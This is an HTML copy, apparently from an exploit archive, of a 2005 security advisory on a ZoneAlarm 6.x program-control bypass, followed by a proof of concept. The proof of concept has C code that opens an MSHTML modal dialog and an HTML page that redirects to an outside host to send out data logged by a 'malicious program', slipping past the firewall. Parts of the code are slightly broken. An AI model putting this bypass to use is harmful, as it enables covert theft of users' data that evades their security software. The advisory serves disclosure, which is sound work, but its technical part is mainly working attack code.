@@ -1,0 +1,110 @@
+#SpeeDr00t@Black Falcon<br>#bid15347<p><b><span style="font-size: 18pt;">Zone Labs Zone Alarm Advance Program Control Bypass Weakness</span></b></p><br><br><a href="http://www.securityfocus.com/bid/15347/info">info</a><br><a href="http://www.securityfocus.com/bid/15347/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/15347/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/15347/solution">solution</a><br><a href="http://www.securityfocus.com/bid/15347/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				15347
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 07 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 07 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovered by Tr0y (a.k.a Debasis Mohanty) &lt;debasis@hackingspirits.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Zone Labs ZoneAlarm Pro 6.0 <br/>
+					
+				
+					Zone Labs ZoneAlarm Internet Security Suite 6.0 <br/>
+					
+				
+					Zone Labs ZoneAlarm Antivirus 6.0 <br/>
+					
+				
+					Zone Labs ZoneAlarm Anti-Spyware 6.1 <br/>
+					
+				
+					Zone Labs ZoneAlarm Anti-Spyware 6.0 <br/>
+					
+				
+					Zone Labs ZoneAlarm 6.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept is available:<br/>&lt;&lt;&lt; osfwbypass-demo.c &gt;&gt;&gt;<br/><br/>BOOL LoadHtmlDialog(void)<br/>{<br/>HINSTANCE hinstMSHTML = LoadLibrary(TEXT("MSHTML.DLL"));<br/><br/>if (hinstMSHTML)<br/>{<br/>SHOWHTMLDIALOGFN* pfnShowHTMLDialog;<br/><br/>// Open a Modal Dialog box of HTML content type<br/>pfnShowHTMLDialog = (SHOWHTMLDIALOGFN*)GetProcAddress(hinstMSHTML,<br/>TEXT("ShowHTMLDialog"));<br/><br/>if (pfnShowHTMLDialog)<br/>{<br/>IMoniker *pURLMoniker;<br/><br/>// Invoke the html file containing the data to be sent via http<br/>BSTR bstrURL = SysAllocString(L"c:\\modal-dialog.htm");<br/>CreateURLMoniker(NULL, bstrURL, &amp;pURLMoniker);<br/><br/>if (pURLMoniker)<br/>{<br/>(*pfnShowHTMLDialog)(NULL, pURLMoniker, NULL, NULL, NULL);<br/>pURLMoniker-&gt;Release();<br/>}<br/><br/>SysFreeString(bstrURL);<br/>}<br/><br/>FreeLibrary(hinstMSHTML);<br/>}<br/><br/>Return True;<br/>}<br/><br/>&lt;&lt;&lt; +++ &gt;&gt;&gt;<br/><br/><br/>&lt;&lt;&lt; modal-dialog.htm &gt;&gt;&gt;<br/>&lt;html&gt;<br/>&lt;head&gt;<br/>&lt;meta http-equiv="Content-Language" content="en-us"&gt;<br/>&lt;title&gt;Redirection Dialog&lt;/title&gt;<br/><br/>&lt;script language="JavaScript"&gt;<br/><br/>&lt;!--  Here goes the information logged by the malicious program which will<br/>be sent to the evil site via http request --&gt;<br/>var sTargetURL =<br/>"http://www.hackingspirits.com/vuln-rnd/demo/defeat-osfw.asp?Your<br/>Information Here<br/>window.location.href = sTargetURL;<br/>window.close;<br/>&lt;/script&gt;<br/><br/>&lt;/head&gt;<br/>&lt;/html&gt;<br/>&lt;&lt;&lt; +++ &gt;&gt;&gt;
+	
+		<ul>
+</ul>
+</div>
